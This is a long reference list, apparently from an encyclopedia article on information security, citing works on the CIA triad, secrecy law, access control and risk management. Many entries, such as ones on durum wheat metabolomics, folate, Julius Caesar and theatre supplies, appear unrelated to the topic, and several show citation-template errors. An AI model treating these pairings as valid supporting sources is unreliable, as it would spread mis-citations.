^ Бучик, С. С.; Юдін, О. К.; Нетребко, Р. В. (2016-12-21). "The analysis of methods of determination of functional types of security of the information-telecommunication system from an unauthorized access". Problems of Informatization and Management. 4 (56). doi:10.18372/2073-4751.4.13135. ISSN 2073-4751.

^ a b Samonas, S.; Coss, D. (2014). "The CIA Strikes Back: Redefining Confidentiality, Integrity and Availability in Security". Journal of Information System Security. 10 (3): 21–45. Archived from the original on 2018-09-22. Retrieved 2018-01-25.

^ "Gartner Says Digital Disruptors Are Impacting All Industries; Digital KPIs Are Crucial to Measuring Success". Gartner. 2 October 2017. Retrieved 25 January 2018.

^ "Gartner Survey Shows 42 Percent of CEOs Have Begun Digital Business Transformation". Gartner. 24 April 2017. Retrieved 25 January 2018.

^ Forte, Dario; Power, Richard (December 2007). "Baseline controls in some vital but often-overlooked areas of your information protection programme". Computer Fraud & Security. 2007 (12): 17–20. doi:10.1016/s1361-3723(07)70170-7. ISSN 1361-3723.

^ Low-voltage switchgear and controlgear. Device profiles for networked industrial devices, BSI British Standards, doi:10.3403/bsen61915, retrieved 2021-05-28

^ Fetzer, James; Highfill, Tina; Hossiso, Kassu; Howells, Thomas; Strassner, Erich; Young, Jeffrey (November 2018). "Accounting for Firm Heterogeneity within U.S. Industries: Extended Supply-Use Tables and Trade in Value Added using Enterprise and Establishment Level Data". Cambridge, MA. doi:10.3386/w25249. S2CID 169324096. {{cite journal}}: Cite journal requires |journal= (help)

^ "Secure estimation subject to cyber stochastic attacks", Cloud Control Systems, Emerging Methodologies and Applications in Modelling, Elsevier: 373–404, 2020, doi:10.1016/b978-0-12-818701-2.00021-4, ISBN 978-0-12-818701-2, S2CID 240746156, retrieved 2021-05-28

^ Nijmeijer, H. (2003). Synchronization of mechanical systems. World Scientific. ISBN 978-981-279-497-0. OCLC 262846185.

^ "Chapter 1. How students' use of computers has evolved in recent years". dx.doi.org. doi:10.1787/888933277851. Retrieved 2021-05-28.

^ Information technology. Security techniques. Competence requirements for information security management systems professionals, BSI British Standards, doi:10.3403/30342674, retrieved 2021-05-29

^ "Information Security Qualifications Fact Sheet" (PDF). IT Governance. Retrieved 16 March 2018.

^ Ma, Ruiqing Ray (March 2016). "Flexible Displays Come in Many Forms". Information Display. 32 (2): 4–49. doi:10.1002/j.2637-496x.2016.tb00883.x. ISSN 0362-0972.

^ Rahim, Noor H. (March 2006). Human Rights and Internal Security in Malaysia: Rhetoric and Reality. Defense Technical Information Center. OCLC 74288358.

^ Kramer, David (2018-09-14). "Nuclear theft and sabotage threats remain high, report warns". Physics Today. doi:10.1063/pt.6.2.20180914a. ISSN 1945-0699. S2CID 240223415.

^ Wilding, Edward (2 March 2017). Information risk and security : preventing and investigating workplace computer crime. ISBN 978-1-351-92755-0. OCLC 1052118207.

^ Stewart, James (2012). CISSP Study Guide. Canada: John Wiley & Sons. pp. 255–257. ISBN 978-1-118-31417-3.

^ "2.2. Productivity growth has been trending down in many sectors". dx.doi.org. doi:10.1787/734700048756. Retrieved 2021-05-28.

^ "Identity Theft: The Newest Digital Attackking Industry Must Take Seriously". Issues in Information Systems. 2007. doi:10.48009/2_iis_2007_297-302. ISSN 1529-7314.

^ Wendel-Persson, Anna; Ronnhed, Fredrik (2017). IT-säkerhet och människan : De har världens starkaste mur men porten står alltid på glänt. Umeå universitet, Institutionen för informatik. OCLC 1233659973.

^ Enge, Eric (5 April 2017). "Stone Temple". Archived from the original on 27 April 2018. Retrieved 17 November 2017. Cell phones

^ Shao, Ruodan; Skarlicki, Daniel P. (2014). "Sabotage toward the Customers who Mistreated Employees Scale". PsycTESTS Dataset. doi:10.1037/t31653-000. Retrieved 2021-05-28.

^ Kitchen, Julie (June 2008). "7side – Company Information, Company Formations and Property Searches". Legal Information Management. 8 (2): 146. doi:10.1017/s1472669608000364. ISSN 1472-6696. S2CID 144325193.

^ Young, Courtenay (2018-05-08), "Working with panic attacks", Help Yourself Towards Mental Health, Routledge, pp. 209–214, doi:10.4324/9780429475474-32, ISBN 978-0-429-47547-4, retrieved 2021-05-28

^ "Introduction: Inside the Insider Threat", Insider Threats, Cornell University Press, pp. 1–9, 2017-12-31, doi:10.7591/9781501705946-003, ISBN 978-1-5017-0594-6, retrieved 2021-05-28

^ "Table 7.7 France: Comparison of the profit shares of non-financial corporations and non-financial corporations plus unincorporated enterprises". dx.doi.org. doi:10.1787/888933144055. Retrieved 2021-05-28.

^ "How Did it All Come About?", The Compliance Business and Its Customers, Basingstoke: Palgrave Macmillan, 2012, doi:10.1057/9781137271150.0007, ISBN 978-1-137-27115-0, retrieved 2021-05-28

^ Gordon, Lawrence; Loeb, Martin (November 2002). "The Economics of Information Security Investment". ACM Transactions on Information and System Security. 5 (4): 438–457. doi:10.1145/581271.581274. S2CID 1500788.

^ Cho Kim, Byung; Khansa, Lara; James, Tabitha (July 2011). "Individual Trust and Consumer Risk Perception". Journal of Information Privacy and Security. 7 (3): 3–22. doi:10.1080/15536548.2011.10855915. ISSN 1553-6548. S2CID 144643691.

^ Stewart, James (2012). CISSP Certified Information Systems Security Professional Study Guide Sixth Edition. Canada: John Wiley & Sons, Inc. pp. 255–257. ISBN 978-1-118-31417-3.

^ Gillett, John (March 1994). "The cost-benefit of outsourcing: assessing the true cost of your outsourcing strategy". European Journal of Purchasing & Supply Management. 1 (1): 45–47. doi:10.1016/0969-7012(94)90042-6. ISSN 0969-7012.

^ "2.1. Despite strong growth, Austria has lost some ground since the early 1990s". dx.doi.org. doi:10.1787/645173688502. Retrieved 2021-05-29.

^ "Introduction : Caesar Is Dead. Long Live Caesar!", Julius Caesar’s Self-Created Image and Its Dramatic Afterlife, Bloomsbury Academic, 2018, doi:10.5040/9781474245784.0005, ISBN 978-1-4742-4578-4, retrieved 2021-05-29

^ Suetonius Tranquillus, Gaius (2008). Lives of the Caesars (Oxford World's Classics). New York: Oxford University Press. p. 28. ISBN 978-0-19-953756-3.

^ Singh, Simon (2000). The Code Book. Anchor. pp. 289–290. ISBN 978-0-385-49532-5.

^ Tan, Heng Chuan (2017). Towards trusted and secure communications in a vehicular environment (Thesis). Nanyang Technological University. doi:10.32657/10356/72758.

^ Johnson, John (1997). The Evolution of British Sigint: 1653–1939. Her Majesty's Stationery Office. ASIN B00GYX1GX2.

^ Willison, Matthew (14 September 2018). "Were Banks Special? Contrasting Viewpoints in Mid-Nineteenth Century Britain". doi:10.2139/ssrn.3249510. S2CID 169606130. {{cite journal}}: Cite journal requires |journal= (help)

^ Ruppert, K. (2011). "Official Secrets Act (1889; New 1911; Amended 1920, 1939, 1989)".  In Hastedt, G.P. (ed.). Spies, Wiretaps, and Secret Operations: An Encyclopedia of American Espionage. Vol. 2. ABC-CLIO. pp. 589–590. ISBN 9781851098088.

^ "2. The Clayton Act: A consideration of section 2, defining unlawful price discrimination.", The Federal Anti-Trust Law, Columbia University Press, pp. 18–28, 1930-12-31, doi:10.7312/dunn93452-003, ISBN 978-0-231-89377-0, retrieved 2021-05-29

^ Maer, Lucinda; Gay (30 December 2008). "Official Secrecy" (PDF). Federation of American Scientists.

^ "The Official Secrets Act 1989 which replaced section 2 of the 1911 Act", Espionage and Secrecy (Routledge Revivals), Routledge, pp. 267–282, 2016-06-10, doi:10.4324/9781315542515-21, ISBN 978-1-315-54251-5, retrieved 2021-05-29

^ "Official Secrets Act: what it covers; when it has been used, questioned". The Indian Express. 2019-03-08. Retrieved 2020-08-07.

^ Singh, Gajendra (November 2015). ""Breaking the Chains with Which We were Bound": The Interrogation Chamber, the Indian National Army and the Negation of Military Identities, 1941–1947". Brill's Digital Library of World War I. doi:10.1163/2352-3786_dlws1_b9789004211452_019. Retrieved 2021-05-28.

^ Duncanson, Dennis (June 1982). "The scramble to unscramble French Indochina". Asian Affairs. 13 (2): 161–170. doi:10.1080/03068378208730070. ISSN 0306-8374.

^ Whitman et al. 2017, pp. 3.

^ "Allied Power. Mobilizing Hydro-Electricity During Canada'S Second World War", Allied Power, University of Toronto Press, pp. 1–2, 2015-12-31, doi:10.3138/9781442617117-003, ISBN 978-1-4426-1711-7, retrieved 2021-05-29

^ Glatthaar, Joseph T. (2011-06-15), "Officers and Enlisted Men", Soldiering in the Army of Northern Virginia, University of North Carolina Press, pp. 83–96, doi:10.5149/9780807877869_glatthaar.11, ISBN 978-0-8078-3492-3, retrieved 2021-05-28

^ a b Sebag–Montefiore, H. (2011). Enigma: The Battle for the Code. Orion. p. 576. ISBN 9781780221236.

^ Whitman et al. 2017, pp. 4–5.

^ a b Whitman et al. 2017, p. 5.

^ "Twentieth-Century Wisdom for Twenty-First-Century Communities", Thomas Merton, The Lutterworth Press, pp. 160–184, 2012-04-26, doi:10.2307/j.ctt1cg4k28.13, ISBN 978-0-7188-4069-3, retrieved 2021-05-29

^ Murphy, Richard C. (2009-09-01). "Building more powerful less expensive supercomputers using Processing-In-Memory (PIM) LDRD final report". doi:10.2172/993898. {{cite journal}}: Cite journal requires |journal= (help)

^ "A Brief History of the Internet". www.usg.edu. Retrieved 2020-08-07.

^ "Walking through the view of Delft - on Internet". Computers & Graphics. 25 (5): 927. October 2001. doi:10.1016/s0097-8493(01)00149-2. ISSN 0097-8493.

^ DeNardis, L. (2007). "Chapter 24: A History of Internet Security".  In de Leeuw, K.M.M.; Bergstra, J. (eds.). The History of Information Security: A Comprehensive Handbook. Elsevier. pp. 681–704. ISBN 9780080550589.

^ Perrin, Chad (30 June 2008). "The CIA Triad". Retrieved 31 May 2012.

^ Sandhu, Ravi; Jajodia, Sushil (2000-10-20), "Relational Database Security", Information Security Management Handbook, Four Volume Set, Auerbach Publications, doi:10.1201/9780203325438.ch120, ISBN 978-0-8493-1068-3, retrieved 2021-05-29

^ a b Stoneburner, G.; Hayden, C.; Feringa, A. (2004). "Engineering Principles for Information Technology Security" (PDF). csrc.nist.gov. doi:10.6028/NIST.SP.800-27rA. {{cite journal}}: Cite journal requires |journal= (help)

^ A. J. Neumann, N. Statland and R. D. Webb (1977). "Post-processing audit tools and techniques" (PDF). US Department of Commerce, National Bureau of Standards. pp. 11-3--11-4.

^ "oecd.org" (PDF). Archived from the original (PDF) on May 16, 2011. Retrieved 2014-01-17.

^ "GSSP (Generally-Accepted system Security Principles): A trip to abilene". Computers & Security. 15 (5): 417. January 1996. doi:10.1016/0167-4048(96)82630-7. ISSN 0167-4048.

^ Slade, Rob. "(ICS)2 Blog".

^ Aceituno, Vicente. "Open Information Security Maturity Model". Retrieved 12 February 2017.

^ "George Cybenko – George Cybenko's Personal Home Page" (PDF).

^ Hughes, Jeff; Cybenko, George (21 June 2018). "Quantitative Metrics and Risk Assessment: The Three Tenets Model of Cybersecurity". Technology Innovation Management Review. 3 (8).

^ Teplow, Lily. "Are Your Clients Falling for These IT Security Myths? [CHART]". continuum.net.

^ Beckers, K. (2015). Pattern and Security Requirements: Engineering-Based Establishment of Security Standards. Springer. p. 100. ISBN 9783319166643.

^ "Data Privacy and Confidentiality", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_205286, retrieved 2021-05-29

^ a b c d e Andress, J. (2014). The Basics of Information Security: Understanding the Fundamentals of InfoSec in Theory and Practice. Syngress. p. 240. ISBN 9780128008126.

^ Boritz, J. Efrim (2005). "IS Practitioners' Views on Core Concepts of Information Integrity". International Journal of Accounting Information Systems. Elsevier. 6 (4): 260–279. doi:10.1016/j.accinf.2005.07.001.

^ Hryshko, I. (2020). "Unauthorized Occupation of Land and Unauthorized Construction: Concepts and Types of Tactical Means of Investigation". International Humanitarian University Herald. Jurisprudence (43): 180–184. doi:10.32841/2307-1745.2020.43.40. ISSN 2307-1745.

^ Kim, Bonn-Oh (2000-09-21), "Referential Integrity for Database Design", High-Performance Web Databases, Auerbach Publications, pp. 427–434, doi:10.1201/9781420031560-34, ISBN 978-0-429-11600-1, retrieved 2021-05-29

^ Pevnev, V. (2018). "Model Threats and Ensure the Integrity of Information". Systems and Technologies. 2 (56): 80–95. doi:10.32836/2521-6643-2018.2-56.6. ISSN 2521-6643.

^ Fan, Lejun; Wang, Yuanzhuo; Cheng, Xueqi; Li, Jinming; Jin, Shuyuan (2013-02-26). "Privacy theft malware multi-process collaboration analysis". Security and Communication Networks. 8 (1): 51–67. doi:10.1002/sec.705. ISSN 1939-0114.

^ "Completeness, Consistency, and Integrity of the Data Model". Measuring Data Quality for Ongoing Improvement. MK Series on Business Intelligence. Elsevier. 2013. pp. e11–e19. doi:10.1016/b978-0-12-397033-6.00030-4. ISBN 978-0-12-397033-6. Retrieved 2021-05-29.

^ "Video from SPIE - the International Society for Optics and Photonics". dx.doi.org. doi:10.1117/12.2266326.5459349132001. Retrieved 2021-05-29.

^ "Communication Skills Used by Information Systems Graduates". Issues in Information Systems. 2005. doi:10.48009/1_iis_2005_311-317. ISSN 1529-7314.

^ "Outages of electric power supply resulting from cable failures Boston Edison Company system". 1980-07-01. doi:10.2172/5083196. OSTI 5083196. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ Loukas, G.; Oke, G. (September 2010) [August 2009]. "Protection Against Denial of Service Attacks: A Survey" (PDF). Comput. J. 53 (7): 1020–1037. doi:10.1093/comjnl/bxp078. Archived from the original (PDF) on 2012-03-24. Retrieved 2015-08-28.

^ "Be Able To Perform a Clinical Activity", Definitions, Qeios, 2020-02-02, doi:10.32388/dine5x, S2CID 241238722, retrieved 2021-05-29

^ Ohta, Mai; Fujii, Takeo (May 2011). "Iterative cooperative sensing on shared primary spectrum for improving sensing ability". 2011 IEEE International Symposium on Dynamic Spectrum Access Networks (DySPAN). IEEE: 623–627. doi:10.1109/dyspan.2011.5936257. ISBN 978-1-4577-0177-1. S2CID 15119653.

^ Information technology. Information security incident management, BSI British Standards, doi:10.3403/30387743, retrieved 2021-05-29

^ Blum, Dan (2020), "Identify and Align Security-Related Roles", Rational Cybersecurity for Business, Berkeley, CA: Apress, pp. 31–60, doi:10.1007/978-1-4842-5952-8_2, ISBN 978-1-4842-5951-1, S2CID 226626983, retrieved 2021-05-29

^ McCarthy, C. (2006). "Digital Libraries: Security and Preservation Considerations".  In Bidgoli, H. (ed.). Handbook of Information Security, Threats, Vulnerabilities, Prevention, Detection, and Management. Vol. 3. John Wiley & Sons. pp. 49–76. ISBN 9780470051214.

^ Information technology. Open systems interconnection. Security frameworks for open systems, BSI British Standards, doi:10.3403/01110206u, retrieved 2021-05-29

^ Christofori, Ralf (2014-01-01), "Thus could it have been", Julio Rondo - O.k., Meta Memory, Wilhelm Fink Verlag, doi:10.30965/9783846757673_003, ISBN 978-3-7705-5767-7, retrieved 2021-05-29

^ Atkins, D. (May 2021). "Use of the Walnut Digital Signature Algorithm with CBOR Object Signing and Encryption (COSE)". doi:10.17487/rfc9021. S2CID 182252627. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ Le May, I. (2003), "Structural Integrity in the Petrochemical Industry", Comprehensive Structural Integrity, Elsevier, pp. 125–149, doi:10.1016/b0-08-043749-4/01001-6, ISBN 978-0-08-043749-1, retrieved 2021-05-29

^ Sodjahin, Amos; Champagne, Claudia; Coggins, Frank; Gillet, Roland (2017-01-11). "Leading or lagging indicators of risk? The informational content of extra-financial performance scores". Journal of Asset Management. 18 (5): 347–370. doi:10.1057/s41260-016-0039-y. ISSN 1470-8272. S2CID 157485290.

^ Reynolds, E H (1995-07-22). "Folate has potential to cause harm". BMJ. 311 (6999): 257. doi:10.1136/bmj.311.6999.257. ISSN 0959-8138. PMC 2550299. PMID 7503870.

^ Randall, Alan (2011), "Harm, risk, and threat", Risk and Precaution, Cambridge: Cambridge University Press, pp. 31–42, doi:10.1017/cbo9780511974557.003, ISBN 978-0-511-97455-7, retrieved 2021-05-29

^ Grama, J.L. (2014). Legal Issues in Information Security. Jones & Bartlett Learning. p. 550. ISBN 9781284151046.

^ Cannon, David L. (2016-03-04). "Audit Process". CISA: Certified Information Systems Auditor Study Guide (Fourth ed.). pp. 139–214. doi:10.1002/9781119419211.ch3. ISBN 9781119056249.

^ CISA Review Manual 2006. Information Systems Audit and Control Association. 2006. p. 85. ISBN 978-1-933284-15-6.

^ Kadlec, Jaroslav (2012-11-02). "Two‐dimensional process modeling (2DPM)". Business Process Management Journal. 18 (6): 849–875. doi:10.1108/14637151211283320. ISSN 1463-7154.

^ "All Countermeasures Have Some Value, But No Countermeasure Is Perfect", Beyond Fear, New York: Springer-Verlag, pp. 207–232, 2003, doi:10.1007/0-387-21712-6_14, ISBN 0-387-02620-7, retrieved 2021-05-29

^ "Data breaches: Deloitte suffers serious hit while more details emerge about Equifax and Yahoo". Computer Fraud & Security. 2017 (10): 1–3. October 2017. doi:10.1016/s1361-3723(17)30086-6. ISSN 1361-3723.

^ Spagnoletti, Paolo; Resca A. (2008). "The duality of Information Security Management: fighting against predictable and unpredictable threats". Journal of Information System Security. 4 (3): 46–62.

^ Yusoff, Nor Hashim; Yusof, Mohd Radzuan (2009-08-04). "Managing HSE Risk in Harsh Environment". All Days. SPE. doi:10.2118/122545-ms.

^ Baxter, Wesley (2010). Sold out: how Ottawa's downtown business improvement areas have secured and valorized urban space (Thesis). Carleton University. doi:10.22215/etd/2010-09016.

^ de Souza, André; Lynch, Anthony (June 2012). "Does Mutual Fund Performance Vary over the Business Cycle?". Cambridge, MA. doi:10.3386/w18137. {{cite journal}}: Cite journal requires |journal= (help)

^ Kiountouzis, E.A.; Kokolakis, S.A. (1996-05-31). Information systems security: facing the information society of the 21st century. London: Chapman & Hall, Ltd. ISBN 978-0-412-78120-9.

^ Newsome, B. (2013). A Practical Introduction to Security and Risk Management. SAGE Publications. p. 208. ISBN 9781483324852.

^ a b Whitman, M.E.; Mattord, H.J. (2016). Management of Information Security (5th ed.). Cengage Learning. p. 592. ISBN 9781305501256.

^ "Hardware, Fabrics, Adhesives, and Other Theatrical Supplies", Illustrated Theatre Production Guide, Routledge, pp. 203–232, 2013-03-20, doi:10.4324/9780080958392-20, ISBN 978-0-08-095839-2, retrieved 2021-05-29

^ Reason, James (2017-03-02), "Perceptions of Unsafe Acts", The Human Contribution, CRC Press, pp. 69–103, doi:10.1201/9781315239125-7, ISBN 978-1-315-23912-5, retrieved 2021-05-29

^ "Information Security Procedures and Standards", Information Security Policies, Procedures, and Standards, Boca Raton, FL: Auerbach Publications, pp. 81–92, 2017-03-27, doi:10.1201/9781315372785-5, ISBN 978-1-315-37278-5, retrieved 2021-05-29

^ Zhuang, Haifeng; Chen, Yu; Sheng, Xianfu; Hong, Lili; Gao, Ruilan; Zhuang, Xiaofen (25 June 2020). "Figure S1: Analysis of the prognostic impact of each single signature gene". PeerJ. 8: e9437. doi:10.7717/peerj.9437/supp-1. Retrieved 2021-05-29.

^ Standaert, B.; Ethgen, O.; Emerson, R.A. (June 2012). "CO4 Cost-Effectiveness Analysis - Appropriate for All Situations?". Value in Health. 15 (4): A2. doi:10.1016/j.jval.2012.03.015. ISSN 1098-3015.

^ "GRP canopies provide cost-effective over-door protection". Reinforced Plastics. 40 (11): 8. November 1996. doi:10.1016/s0034-3617(96)91328-4. ISSN 0034-3617.

^ "Figure 2.3. Relative risk of being a low performer depending on personal circumstances (2012)". dx.doi.org. doi:10.1787/888933171410. Retrieved 2021-05-29.

^ Stoneburner, Gary; Goguen, Alice; Feringa, Alexis (2002). "NIST SP 800-30 Risk Management Guide for Information Technology Systems". doi:10.6028/NIST.SP.800-30. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ "May I Choose? Can I Choose? Oppression and Choice", A Theory of Freedom, Palgrave Macmillan, 2012, doi:10.1057/9781137295026.0007, ISBN 978-1-137-29502-6, retrieved 2021-05-29

^ Parker, Donn B. (January 1994). "A Guide to Selecting and Implementing Security Controls". Information Systems Security. 3 (2): 75–86. doi:10.1080/10658989409342459. ISSN 1065-898X.

^ Zoccali, Carmine; Mallamaci, Francesca; Tripepi, Giovanni (2007-09-25). "Guest Editor: Rajiv Agarwal: Cardiovascular Risk Profile Assessment and Medication Control Should Come First". Seminars in Dialysis. 20 (5): 405–408. doi:10.1111/j.1525-139x.2007.00317.x. ISSN 0894-0959. PMID 17897245. S2CID 33256127.

^ Guide to the Implementation and Auditing of ISMS Controls based on ISO/IEC 27001. London: BSI British Standards. 2013-11-01. doi:10.3403/9780580829109. ISBN 978-0-580-82910-9.

^ Johnson, L. (2015). Security Controls Evaluation, Testing, and Assessment Handbook. Syngress. p. 678. ISBN 9780128025642.

^ Information technology. Security techniques. Mapping the revised editions of ISO/IEC 27001 and ISO/IEC 27002, BSI British Standards, doi:10.3403/30310928, retrieved 2021-05-29

^ a b c "Administrative Controls", Occupational Ergonomics, CRC Press, pp. 443–666, 2003-03-26, doi:10.1201/9780203507933-6, ISBN 978-0-429-21155-3, retrieved 2021-05-29

^ Chen, J.; Demers, E.A.; Lev, B. (June 2013). "How Time of Day Impacts on Business Conversations". doi:10.13007/141. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)CS1 maint: multiple names: authors list (link)

^ 44 U.S.C. § 3542(b)(1)

^ "Appendix D", Information Security Policy Development for Compliance, Auerbach Publications, pp. 117–136, 2013-03-22, doi:10.1201/b13922-12, ISBN 978-1-4665-8058-9, retrieved 2021-05-29

^ "Firewalls, Intrusion Detection Systems and Vulnerability Assessment: A Superior Conjunction?". Network Security. 2002 (9): 8–11. September 2002. doi:10.1016/s1353-4858(02)09009-8. ISSN 1353-4858.

^ Ransome, J.; Misra, A. (2013). Core Software Security: Security at the Source. CRC Press. pp. 40–41. ISBN 9781466560956.

^ "least privilege principle", SpringerReference, Berlin/Heidelberg: Springer-Verlag, 2011, doi:10.1007/springerreference_17456, retrieved 2021-05-29

^ Emir, Astra (September 2018). "19. Duties of Ex-employees". Law Trove. doi:10.1093/he/9780198814849.003.0019. ISBN 978-0-19-185251-0.

^ Guide for Information Access Privileges to Health Information, ASTM International, doi:10.1520/e1986-09, retrieved 2021-05-29

^ Drury, Bill (2009-01-01), "Physical environment", Control Techniques, Drives and Controls Handbook, Institution of Engineering and Technology: 355–381, doi:10.1049/pbpo057e_chb3, ISBN 978-1-84919-013-8, retrieved 2021-05-29

^ Fire detection and fire alarms systems, BSI British Standards, doi:10.3403/30266863, retrieved 2021-05-29

^ Silverman, Arnold B. (November 2001). "Employee exit interviews—An important but frequently overlooked procedure". JOM. 53 (11): 48. Bibcode:2001JOM....53k..48S. doi:10.1007/s11837-001-0195-4. ISSN 1047-4838. S2CID 137528079.

^ "Many employee pharmacists should be able to benefit". The Pharmaceutical Journal. 2013. doi:10.1211/pj.2013.11124182. ISSN 2053-6186.

^ "Segregation of Duties Control matrix". ISACA. 2008. Archived from the original on 3 July 2011. Retrieved 2008-09-30.

^ "Residents Must Protect Their Private Information". JAMA. 279 (17): 1410B. 1998-05-06. doi:10.1001/jama.279.17.1410. ISSN 0098-7484.

^ "Group Wisdom Support Systems: Aggregating the Insights of Many Through Information Technology". Issues in Information Systems. 2008. doi:10.48009/2_iis_2008_343-350. ISSN 1529-7314.

^ "INTERDEPENDENCIES OF INFORMATION SYSTEMS", Lessons Learned: Critical Information Infrastructure Protection, IT Governance Publishing, pp. 34–37, 2018, doi:10.2307/j.ctt1xhr7hq.13, ISBN 978-1-84928-958-0, retrieved 2021-05-29

^ "Managing Network Security", Network Perimeter Security, Auerbach Publications, pp. 17–66, 2003-10-27, doi:10.1201/9780203508046-3, ISBN 978-0-429-21157-7, retrieved 2021-05-29

^ Kakareka, A. (2013). "Chapter 31: What is Vulnerability Assessment?".  In Vacca, J.R. (ed.). Computer and Information Security Handbook (2nd ed.). Elsevier. pp. 541–552. ISBN 9780123946126.

^ Duke, P. A.; Howard, I. P. (2012-08-17). "Processing vertical size disparities in distinct depth planes". Journal of Vision. 12 (8): 10. doi:10.1167/12.8.10. ISSN 1534-7362. PMID 22904355.

^ "Security Onion Control Scripts". Applied Network Security Monitoring. Elsevier. 2014. pp. 451–456. doi:10.1016/b978-0-12-417208-1.09986-4. ISBN 978-0-12-417208-1. Retrieved 2021-05-29.

^ "Metabolomics Provides Valuable Insight for the Study of Durum Wheat: A Review". dx.doi.org. doi:10.1021/acs.jafc.8b07097.s001. Retrieved 2021-05-29.

^ "Overview", Information Security Policies, Procedures, and Standards, Auerbach Publications, 2001-12-20, doi:10.1201/9780849390326.ch1, ISBN 978-0-8493-1137-6, retrieved 2021-05-29

^ Electrical protection relays. Information and requirements for all protection relays, BSI British Standards, doi:10.3403/bs142-1, retrieved 2021-05-29

^ Dibattista, Joseph D.; Reimer, James D.; Stat, Michael; Masucci, Giovanni D.; Biondi, Piera; Brauwer, Maarten De; Bunce, Michael (6 February 2019). "Supplemental Information 4: List of all combined families in alphabetical order assigned in MEGAN vers. 5.11.3". PeerJ. 7: e6379. doi:10.7717/peerj.6379/supp-4. Retrieved 2021-05-29.

^ Kim, Sung-Won (2006-03-31). "A Quantitative Analysis of Classification Classes and Classified Information Resources of Directory". Journal of Information Management. 37 (1): 83–103. doi:10.1633/jim.2006.37.1.083. ISSN 0254-3621.

^ a b Bayuk, J. (2009). "Chapter 4: Information Classification".  In Axelrod, C.W.; Bayuk, J.L.; Schutzer, D. (eds.). Enterprise Information Security and Privacy. Artech House. pp. 59–70. ISBN 9781596931916.

^ "Welcome to the Information Age", Overload!, Hoboken, NJ, USA: John Wiley & Sons, Inc., pp. 43–65, 2015-09-11, doi:10.1002/9781119200642.ch5, ISBN 978-1-119-20064-2, retrieved 2021-05-29

^ Crooks, S. (2006). "102. Case Study: When Exposure Control Efforts Override Other Important Design Considerations". AIHce 2006. AIHA. doi:10.3320/1.2759009.

^ "Business Model for Information Security (BMIS)". ISACA. Retrieved 25 January 2018.

^ McAuliffe, Leo (January 1987). "Top secret/trade secret: Accessing and safeguarding restricted information". Government Information Quarterly. 4 (1): 123–124. doi:10.1016/0740-624x(87)90068-2. ISSN 0740-624X.

^ Khairuddin, Ismail Mohd; Sidek, Shahrul Naim; Abdul Majeed, Anwar P.P.; Razman, Mohd Azraai Mohd; Puzi, Asmarani Ahmad; Yusof, Hazlina Md (25 February 2021). "Figure 7: Classification accuracy for each model for all features". PeerJ Computer Science. 7: e379. doi:10.7717/peerj-cs.379/fig-7. Retrieved 2021-05-29.

^ "Asset Classification", Information Security Fundamentals, Auerbach Publications, pp. 327–356, 2013-10-16, doi:10.1201/b15573-18, ISBN 978-0-429-13028-1, retrieved 2021-06-01

^ a b Almehmadi, Abdulaziz; El-Khatib, Khalil (2013). "Authorized! access denied, unauthorized! access granted". Proceedings of the 6th International Conference on Security of Information and Networks - SIN '13. Sin '13. New York, New York, USA: ACM Press: 363–367. doi:10.1145/2523514.2523612. ISBN 978-1-4503-2498-4. S2CID 17260474.

^ a b Peiss, Kathy (2020), "The Country of the Mind Must Also Attack", Information Hunters, Oxford University Press, pp. 16–39, doi:10.1093/oso/9780190944612.003.0003, ISBN 978-0-19-094461-2, retrieved 2021-06-01

^ Fugini, M.G.; Martella, G. (January 1988). "A petri-net model of access control mechanisms". Information Systems. 13 (1): 53–63. doi:10.1016/0306-4379(88)90026-9. ISSN 0306-4379.

^ Information technology. Personal identification. ISO-compliant driving licence, BSI British Standards, doi:10.3403/30170670u, retrieved 2021-06-01

^ Santos, Omar (2015). Ccna security 210-260 official cert guide. Cisco press. ISBN 978-1-58720-566-8. OCLC 951897116.

^ "What is Assertion?", ASSERTION TRAINING, Abingdon, UK: Taylor & Francis, pp. 1–7, 1991, doi:10.4324/9780203169186_chapter_one, ISBN 978-0-203-28556-5, retrieved 2021-06-01

^ Doe, John (1960). "Field Season In Illinois Begins May 2". Soil Horizons. 1 (2): 10. doi:10.2136/sh1960.2.0010. ISSN 2163-2812.

^ Leech, M. (March 1996). "Username/Password Authentication for SOCKS V5". doi:10.17487/rfc1929. Retrieved 18 January 2022. {{cite journal}}: Cite journal requires |journal= (help)

^ Kirk, John; Wall, Christine (2011), "Teller, Seller, Union Activist: Class Formation and Changing Bank Worker Identities", Work and Identity, London: Palgrave Macmillan UK, pp. 124–148, doi:10.1057/9780230305625_6, ISBN 978-1-349-36871-6, retrieved 2021-06-01

^ Dewi, Mila Nurmala (2020-12-23). "Perbandingan Kinerja Teller Kriya Dan Teller Organik Pt. Bank Syariah Mandiri". Nisbah: Jurnal Perbankan Syariah. 6 (2): 75. doi:10.30997/jn.v6i2.1932. ISSN 2528-6633. S2CID 234420571.

^ Vile, John (2013), "License Checks", Encyclopedia of the Fourth Amendment, Washington DC: CQ Press, doi:10.4135/9781452234243.n462, ISBN 978-1-60426-589-7, retrieved 2021-06-01

^ "He Said/She Said", My Ghost Has a Name, University of South Carolina Press, pp. 17–32, doi:10.2307/j.ctv6wgjjv.6, ISBN 978-1-61117-827-2, retrieved 2021-05-29

^ Bacigalupo, Sonny A.; Dixon, Linda K.; Gubbins, Simon; Kucharski, Adam J.; Drewe, Julian A. (26 October 2020). "Supplemental Information 8: Methods used to monitor different types of contact". PeerJ. 8: e10221. doi:10.7717/peerj.10221/supp-8. Retrieved 2021-06-01.

^ Igelnik, Boris M.; Zurada, Jacek (2013). Efficiency and scalability methods for computational intellect. ISBN 978-1-4666-3942-3. OCLC 833130899.

^ "The Insurance Superbill Must Have Your Name as the Provider", Before You See Your First Client, Routledge, pp. 37–38, 2005-01-01, doi:10.4324/9780203020289-11, ISBN 978-0-203-02028-9, retrieved 2021-06-01

^ Kissell, Joe. Take Control of Your Passwords. ISBN 978-1-4920-6638-5. OCLC 1029606129.

^ "New smart Queensland driver license announced". Card Technology Today. 21 (7): 5. July 2009. doi:10.1016/s0965-2590(09)70126-4. ISSN 0965-2590.

^ Lawrence Livermore National Laboratory. United States. Department of Energy. Office of Scientific and Technical Information (1995). A human engineering and ergonomic evaluation of the security access panel interface. United States. Dept. of Energy. OCLC 727181384.

